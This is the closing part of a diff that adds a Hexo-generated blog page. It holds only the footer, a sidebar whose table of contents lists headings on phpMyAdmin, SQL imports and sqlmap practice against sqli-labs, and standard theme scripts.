+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%A6%E9%95%BF%E8%AF%B4-sql-%E5%BE%88%E9%87%8D%E8%A6%81%EF%BC%8C%E6%88%91%E8%A7%89%E5%BE%97%E5%BA%94%E8%AF%A5%E4%BB%8E%E6%80%8E%E4%B9%88%E5%BC%80%E5%88%9B%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%80%E5%A7%8B%EF%BC%81%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">学长说 sql 很重要，我觉得应该从怎么开创一个数据库开始！！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%93%E4%BD%A0%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E6%97%B6%E5%80%99%E6%83%B3%E8%A6%81%E7%99%BB%E5%85%A5-phpMyAdmin"><span class="toc-number"></span> <span class="toc-text">当你忘记密码时候想要登入&#x2F;phpMyAdmin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%85%A5-phpMyAdmin%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">登入&#x2F;phpMyAdmin：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">修改配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">成功登入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%82%E5%AF%9Fsql%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">观察sql文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E9%9A%8F%E6%9C%BA%E5%AF%BC%E5%87%BA%E4%B8%80%E4%B8%AAsql%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">我们随机导出一个sql文件，发现：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%AF%BC%E5%85%A5%E6%96%B0%E6%95%B0%E6%8D%AE%E5%91%A2%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">我该怎么导入新数据呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E9%80%9A%E8%BF%87-phpMyAdmin-%E5%AF%BC%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">方法 1：通过 phpMyAdmin 导入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">方法 2：通过命令行导入导入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E5%9C%A8-SQL-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">方法 3：在 SQL 文件中直接添加新数据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%93%E9%94%99%E7%82%B9%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">易错点：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">sqlmap使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali%E4%B8%AD%E6%98%AF%E8%87%AA%E5%B8%A6sqlmap%E7%9A%84%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">Kali中是自带sqlmap的：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A%EF%BC%88%E4%BB%A5%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">语法：（以）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">返回：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5sqli-labs%E4%B8%BA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">以sqli-labs为例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">结果：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%98%E5%9C%A8%E5%8D%B3%E5%8F%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">确定存在即可：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E9%93%BE%E6%8E%A5%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">POST链接测试：</span></a>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
